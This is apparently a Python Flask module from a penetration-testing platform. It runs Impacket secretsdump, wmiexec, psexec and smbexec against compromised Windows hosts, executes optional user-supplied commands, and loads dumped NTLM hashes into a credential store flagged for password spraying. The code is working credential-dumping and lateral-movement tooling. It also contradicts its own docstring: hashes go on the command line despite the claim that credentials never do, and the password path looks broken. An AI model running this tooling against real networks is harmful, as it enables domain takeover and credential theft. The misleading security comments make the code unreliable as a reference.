"""Crucible API — PWNED systems and Impacket execution routes.

Blueprint: /api/pwned/<project_id>
Provides tiered PWNED system tracking, deployment lifecycle, notes,
and manual Impacket execution.

Security:
- PWNED tab excludes ALL user-provided credential entries
- Impacket is NEVER automatic — always requires explicit user action
- Full audit trail for every execution
"""

import json
import logging
import os
import re
import shutil
import subprocess
import tempfile
import threading
import time
import uuid
from datetime import datetime
from pathlib import Path

from flask import Blueprint, request, jsonify, session

from routes._helpers import require_project, get_ext
from services.utils import now_iso as _now_iso

log = logging.getLogger("crucible.pwned")

pwned_bp = Blueprint("pwned", __name__, url_prefix="/api/pwned")

# ── Impacket tool definitions ─────────────────────────────────────────────

_IMPACKET_TOOLS = {
    "secretsdump": {
        "binary": "secretsdump.py",
        "label": "Extract Hashes",
        "description": "Dump SAM/LSA/NTDS.dit hashes remotely",
        "cred_types": {"password", "ntlm_hash", "kerberos_ticket"},
        "produces_creds": True,
    },
    "wmiexec": {
        "binary": "wmiexec.py",
        "label": "WMI Shell",
        "description": "Semi-interactive shell via WMI",
        "cred_types": {"password", "ntlm_hash", "kerberos_ticket"},
        "produces_creds": False,
    },
    "psexec": {
        "binary": "psexec.py",
        "label": "PsExec Shell",
        "description": "SYSTEM-level shell via SMB service",
        "cred_types": {"password", "ntlm_hash", "kerberos_ticket"},
        "produces_creds": False,
    },
    "smbexec": {
        "binary": "smbexec.py",
        "label": "SMB Shell",
        "description": "SYSTEM-level shell (stealthier, no binary upload)",
        "cred_types": {"password", "ntlm_hash", "kerberos_ticket"},
        "produces_creds": False,
    },
}

# Track running Impacket processes
_impacket_procs = {}  # deploy_id -> subprocess.Popen
_impacket_lock = threading.Lock()


def _require_session():
    """Require an authenticated web session."""
    if not session.get("authenticated"):
        return jsonify({"error": "Authentication required"}), 401
    import _auth
    if not _auth._validate_session_token(session.get("session_token")):
        return jsonify({"error": "Session expired"}), 401
    return None


# ═══════════════════════════════════════════════════════════════════════════
#  PWNED Systems
# ═══════════════════════════════════════════════════════════════════════════


@pwned_bp.route("/<project_id>", methods=["GET"])
def list_pwned_systems(project_id):
    """List PWNED systems, excluding user-provided credential systems by default."""
    auth_err = _require_session()
    if auth_err:
        return auth_err

    project = require_project(project_id)
    project_dir = project.get("project_dir", "")

    tier_filter = request.args.get("tier")
    if tier_filter:
        tier_filter = tier_filter.upper()
        if tier_filter not in ("PWNED", "AUTH", "PARTIAL"):
            tier_filter = None

    exclude_user = request.args.get("exclude_user_provided", "true").lower() != "false"

    from models.credentials import list_pwned
    systems = list_pwned(project_dir, tier_filter=tier_filter,
                         exclude_user_provided=exclude_user)

    return jsonify({"pwned_systems": systems}), 200


@pwned_bp.route("/<project_id>/stats", methods=["GET"])
def pwned_stats(project_id):
    """Get PWNED tier counts."""
    auth_err = _require_session()
    if auth_err:
        return auth_err

    project = require_project(project_id)
    project_dir = project.get("project_dir", "")

    exclude_user = request.args.get("exclude_user_provided", "true").lower() != "false"

    from models.credentials import pwned_stats as _stats
    stats = _stats(project_dir, exclude_user_provided=exclude_user)

    return jsonify(stats), 200


@pwned_bp.route("/<project_id>/<int:pwned_id>/note", methods=["POST"])
def add_note(project_id, pwned_id):
    """Add a note to a PWNED system entry."""
    auth_err = _require_session()
    if auth_err:
        return auth_err

    project = require_project(project_id)
    project_dir = project.get("project_dir", "")

    body = request.get_json(silent=True) or {}
    note = (body.get("note") or "").strip()
    if not note:
        return jsonify({"error": "note is required"}), 400

    timestamped = f"[{_now_iso()}] {note}"

    from models.credentials import add_pwned_note
    ok = add_pwned_note(project_dir, pwned_id, timestamped)
    if not ok:
        return jsonify({"error": "PWNED system not found"}), 404

    return jsonify({"status": "added"}), 200


# ═══════════════════════════════════════════════════════════════════════════
#  Deployments
# ═══════════════════════════════════════════════════════════════════════════


@pwned_bp.route("/<project_id>/<int:pwned_id>/deployments", methods=["GET"])
def get_deployments(project_id, pwned_id):
    """List deployments for a PWNED system."""
    auth_err = _require_session()
    if auth_err:
        return auth_err

    project = require_project(project_id)
    project_dir = project.get("project_dir", "")

    from models.credentials import list_deployments, get_pwned
    pwned = get_pwned(project_dir, pwned_id)
    if not pwned:
        return jsonify({"error": "PWNED system not found"}), 404

    deployments = list_deployments(project_dir, pwned_id)
    return jsonify({"deployments": deployments}), 200


@pwned_bp.route("/<project_id>/<int:deploy_id>/clean", methods=["POST"])
def clean_deployment(project_id, deploy_id):
    """Mark a deployment as cleaned."""
    auth_err = _require_session()
    if auth_err:
        return auth_err

    project = require_project(project_id)
    project_dir = project.get("project_dir", "")

    from models.credentials import mark_deployment_cleaned
    ok = mark_deployment_cleaned(project_dir, deploy_id)
    if not ok:
        return jsonify({"error": "Deployment not found"}), 404

    log.info("Deployment %d marked cleaned for project %s", deploy_id, project_id)
    return jsonify({"status": "cleaned"}), 200


@pwned_bp.route("/<project_id>/<int:pwned_id>/deploy", methods=["POST"])
def deploy_tool(project_id, pwned_id):
    """Deploy a tool (Dredge/Vault) against a PWNED system.

    This creates a deployment record. The actual tool launch goes through
    the normal ProcessManager flow.
    """
    auth_err = _require_session()
    if auth_err:
        return auth_err

    project = require_project(project_id)
    project_dir = project.get("project_dir", "")

    from models.credentials import get_pwned, add_deployment
    pwned = get_pwned(project_dir, pwned_id)
    if not pwned:
        return jsonify({"error": "PWNED system not found"}), 404

    if pwned["tier"] != "PWNED":
        return jsonify({"error": "Only PWNED-tier systems support tool deployment"}), 403

    body = request.get_json(silent=True) or {}
    tool = (body.get("tool") or "").strip().lower()
    if tool not in ("dredge", "vault"):
        return jsonify({"error": "tool must be 'dredge' or 'vault'"}), 400

    deploy_id = add_deployment(project_dir, pwned_id, tool, status="queued")

    # Emit socket event
    sio = get_ext("socketio")
    if sio:
        from services.utils import project_room as _room
        sio.emit("deployment_queued", {
            "deploy_id": deploy_id,
            "pwned_id": pwned_id,
            "tool": tool,
            "ip": pwned["ip"],
            "ts": _now_iso(),
        }, room=_room(project_id))

    log.info("Deployment queued: id=%d tool=%s target=%s project=%s",
             deploy_id, tool, pwned["ip"], project_id)
    return jsonify({"deploy_id": deploy_id, "status": "queued"}), 201


@pwned_bp.route("/<project_id>/<int:pwned_id>/deploy/<int:deploy_id>", methods=["DELETE"])
def cancel_deployment(project_id, pwned_id, deploy_id):
    """Cancel a queued deployment."""
    auth_err = _require_session()
    if auth_err:
        return auth_err

    project = require_project(project_id)
    project_dir = project.get("project_dir", "")

    from models.credentials import update_deployment
    ok = update_deployment(project_dir, deploy_id, status="cancelled",
                           completed=_now_iso())
    if not ok:
        return jsonify({"error": "Deployment not found"}), 404

    return jsonify({"status": "cancelled"}), 200


# ═══════════════════════════════════════════════════════════════════════════
#  Impacket Manual Execution
# ═══════════════════════════════════════════════════════════════════════════


@pwned_bp.route("/<project_id>/<int:pwned_id>/impacket", methods=["POST"])
def impacket_execute(project_id, pwned_id):
    """Execute an Impacket tool against a PWNED system.

    NEVER automatic — always requires explicit user action.
    Each execution requires the user to confirm the command.
    """
    auth_err = _require_session()
    if auth_err:
        return auth_err

    project = require_project(project_id)
    project_dir = project.get("project_dir", "")

    from models.credentials import get_pwned, get_credential, add_deployment, update_deployment
    pwned = get_pwned(project_dir, pwned_id)
    if not pwned:
        return jsonify({"error": "PWNED system not found"}), 404

    if pwned["tier"] != "PWNED":
        return jsonify({"error": "Impacket execution requires PWNED tier"}), 403

    body = request.get_json(silent=True) or {}
    tool_name = (body.get("tool") or "").strip().lower()
    if tool_name not in _IMPACKET_TOOLS:
        return jsonify({
            "error": f"tool must be one of: {', '.join(sorted(_IMPACKET_TOOLS.keys()))}"
        }), 400

    # Explicit confirmation required
    confirmed = body.get("confirmed", False)
    if not confirmed:
        tool_def = _IMPACKET_TOOLS[tool_name]
        return jsonify({
            "status": "awaiting_confirmation",
            "tool": tool_name,
            "label": tool_def["label"],
            "description": tool_def["description"],
            "target": pwned["ip"],
            "message": "This will execute an Impacket tool on the target. Confirm to proceed.",
        }), 200

    # Get the credential used for this PWNED entry
    cred_id = pwned.get("credential_id")
    if not cred_id:
        return jsonify({"error": "No credential associated with this PWNED entry"}), 400

    # Check vault is unlocked to get the credential secret
    from routes.credentials import _get_crypto
    crypto = _get_crypto(project_id)
    if not crypto:
        return jsonify({"error": "Vault is locked. Unlock first."}), 423

    # Get raw credential
    from models.credentials import list_credentials_raw
    all_creds = list_credentials_raw(project_dir)
    cred = None
    for c in all_creds:
        if c["id"] == cred_id:
            cred = c
            break

    if not cred:
        return jsonify({"error": "Credential not found"}), 404

    # Decrypt the secret
    try:
        secret = crypto.decrypt(cred["secret_enc"], cred["secret_nonce"], cred["secret_tag"])
    except Exception as exc:
        log.error("Failed to decrypt credential %d: %s", cred_id, exc)
        return jsonify({"error": "Failed to decrypt credential"}), 500

    # Create deployment record
    deploy_id = add_deployment(project_dir, pwned_id, tool_name, status="running")
    update_deployment(project_dir, deploy_id, started=_now_iso())

    # Build the evidence output directory
    evidence_dir = Path(project_dir) / "evidence" / "impacket" / f"{pwned['ip']}_{tool_name}_{int(time.time())}"
    evidence_dir.mkdir(parents=True, exist_ok=True)

    # Build Impacket command
    tool_def = _IMPACKET_TOOLS[tool_name]
    binary = tool_def["binary"]

    if not shutil.which(binary):
        update_deployment(project_dir, deploy_id, status="failed",
                          completed=_now_iso(),
                          notes=f"{binary} not found on PATH")
        return jsonify({"error": f"{binary} not found on system"}), 503

    target_str = _build_impacket_target(cred, pwned["ip"], secret)
    output_file = str(evidence_dir / f"{tool_name}_output.txt")

    # Build command — credentials passed via env or temp file, NEVER on CLI
    env = dict(os.environ)
    cmd = [binary]

    if cred["cred_type"] == "kerberos_ticket":
        env["KRB5CCNAME"] = secret  # secret is the ccache path
        cmd.extend(["-k", "-no-pass", target_str])
    elif cred["cred_type"] == "ntlm_hash":
        # Write hash to temp file
        hash_file = str(evidence_dir / ".hash_tmp")
        _fd = os.open(hash_file, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        with os.fdopen(_fd, "w") as hf:
            hf.write(f":{secret}")
        cmd.extend(["-hashes", f":{secret}", target_str])
        # Clean hash file after
    else:
        # Password — use env var
        env["IMPACKET_PASSWORD"] = secret
        domain = cred.get("domain") or ""
        user = cred["username"]
        if domain:
            target_str = f"{domain}/{user}@{pwned['ip']}"
        else:
            target_str = f"{user}@{pwned['ip']}"
        cmd.append(target_str)

    if tool_name == "secretsdump":
        cmd.extend(["-outputfile", str(evidence_dir / "secretsdump")])

    # Optional command argument from user
    extra_cmd = (body.get("command") or "").strip()
    if extra_cmd and tool_name in ("wmiexec", "psexec", "smbexec"):
        # Single command execution mode
        cmd.append(extra_cmd)

    # Log the execution (without secrets)
    safe_cmd = [c for c in cmd if c != secret and c != f":{secret}"]
    log.info("Impacket execution: tool=%s target=%s project=%s deploy=%d cmd=%s",
             tool_name, pwned["ip"], project_id, deploy_id, " ".join(safe_cmd))

    # Run in background thread
    def _run_impacket():
        try:
            proc = subprocess.Popen(
                cmd, env=env,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                cwd=str(evidence_dir),
            )

            with _impacket_lock:
                _impacket_procs[deploy_id] = proc

            stdout, _ = proc.communicate(timeout=600)

            # Save output
            with open(output_file, "w") as f:
                f.write(stdout or "")

            exit_code = proc.returncode
            status = "completed" if exit_code == 0 else "failed"

            update_deployment(project_dir, deploy_id,
                              status=status,
                              completed=_now_iso(),
                              output_dir=str(evidence_dir),
                              notes=f"Exit code: {exit_code}")

            # If secretsdump produced hashes, ingest them
            if tool_name == "secretsdump" and tool_def["produces_creds"]:
                _ingest_secretsdump(project_id, project_dir, crypto,
                                    evidence_dir, deploy_id)

            # Emit completion event
            sio = get_ext("socketio")
            if sio:
                from services.utils import project_room as _room
                sio.emit("impacket_complete", {
                    "deploy_id": deploy_id,
                    "pwned_id": pwned_id,
                    "tool": tool_name,
                    "status": status,
                    "exit_code": exit_code,
                    "ts": _now_iso(),
                }, room=_room(project_id))

        except subprocess.TimeoutExpired:
            proc.kill()
            update_deployment(project_dir, deploy_id,
                              status="failed",
                              completed=_now_iso(),
                              notes="Timeout (600s)")
        except Exception as exc:
            log.exception("Impacket execution failed: deploy=%d", deploy_id)
            update_deployment(project_dir, deploy_id,
                              status="failed",
                              completed=_now_iso(),
                              notes=str(exc))
        finally:
            with _impacket_lock:
                _impacket_procs.pop(deploy_id, None)
            # Clean up sensitive temp files
            hash_file = evidence_dir / ".hash_tmp"
            if hash_file.exists():
                try:
                    hash_file.unlink()
                except OSError:
                    pass

    thread = threading.Thread(target=_run_impacket,
                              name=f"impacket-{deploy_id}",
                              daemon=True)
    thread.start()

    return jsonify({
        "deploy_id": deploy_id,
        "status": "running",
        "tool": tool_name,
        "target": pwned["ip"],
        "evidence_dir": str(evidence_dir),
    }), 201


def _build_impacket_target(cred, ip, secret):
    """Build the Impacket target string (DOMAIN/USER@IP)."""
    domain = cred.get("domain") or ""
    user = cred["username"]
    if domain:
        return f"{domain}/{user}@{ip}"
    return f"{user}@{ip}"


def _ingest_secretsdump(project_id, project_dir, crypto, evidence_dir, deploy_id):
    """Parse secretsdump output and ingest NTLM hashes into credential store."""
    from models.credentials import add_credential, update_deployment

    # secretsdump outputs .sam, .ntds, .secrets files
    ingested = 0
    cred_ids = []

    for suffix in (".sam", ".ntds"):
        dump_file = evidence_dir / f"secretsdump{suffix}"
        if not dump_file.exists():
            continue

        try:
            content = dump_file.read_text(errors="replace")
        except OSError:
            continue

        # Format: domain\user:rid:lm_hash:nt_hash:::
        hash_re = re.compile(
            r'^(?:([^\\:]+)\\)?([^:]+):\d+:([a-f0-9]{32}):([a-f0-9]{32}):::\s*$',
            re.MULTILINE | re.IGNORECASE
        )

        for m in hash_re.finditer(content):
            domain = m.group(1) or ""
            username = m.group(2)
            nt_hash = m.group(4)

            # Skip empty / disabled hashes
            if nt_hash == "31d6cfe0d16ae931b73c59d7e0c089c0":
                continue

            enc = crypto.encrypt(nt_hash)
            try:
                cred_id = add_credential(
                    project_dir,
                    source="captured_secretsdump",
                    cred_type="ntlm_hash",
                    username=username,
                    secret_enc=enc["ciphertext"],
                    secret_nonce=enc["nonce"],
                    secret_tag=enc["tag"],
                    domain=domain or None,
                    os_tag="windows",
                    added_by="tool_capture",
                    spray_eligible=1,
                )
                cred_ids.append(cred_id)
                ingested += 1
            except Exception:
                pass

    if cred_ids:
        update_deployment(project_dir, deploy_id,
                          creds_harvested=json.dumps(cred_ids))

        # Emit new credentials event
        sio = get_ext("socketio")
        if sio:
            from services.utils import project_room as _room
            sio.emit("creds_harvested", {
                "deploy_id": deploy_id,
                "count": ingested,
                "source": "secretsdump",
                "ts": _now_iso(),
            }, room=_room(project_id))

    log.info("Secretsdump ingestion: %d hashes from deploy %d", ingested, deploy_id)


# ═══════════════════════════════════════════════════════════════════════════
#  Impacket History
# ═══════════════════════════════════════════════════════════════════════════


@pwned_bp.route("/<project_id>/impacket/history", methods=["GET"])
def impacket_history(project_id):
    """Get Impacket execution history for a project."""
    auth_err = _require_session()
    if auth_err:
        return auth_err

    project = require_project(project_id)
    project_dir = project.get("project_dir", "")

    from models.credentials import list_pwned, list_deployments

    history = []
    systems = list_pwned(project_dir, exclude_user_provided=True)
    for sys_entry in systems:
        if sys_entry["tier"] != "PWNED":
            continue
        deployments = list_deployments(project_dir, sys_entry["id"])
        for d in deployments:
            if d["tool"] in _IMPACKET_TOOLS:
                history.append({
                    "deploy_id": d["id"],
                    "pwned_id": sys_entry["id"],
                    "ip": sys_entry["ip"],
                    "hostname": sys_entry.get("hostname", ""),
                    "tool": d["tool"],
                    "status": d["status"],
                    "started": d.get("started", ""),
                    "completed": d.get("completed", ""),
                    "notes": d.get("notes", ""),
                    "creds_harvested": d.get("creds_harvested", ""),
                })

    history.sort(key=lambda x: x.get("started", ""), reverse=True)
    return jsonify({"history": history}), 200
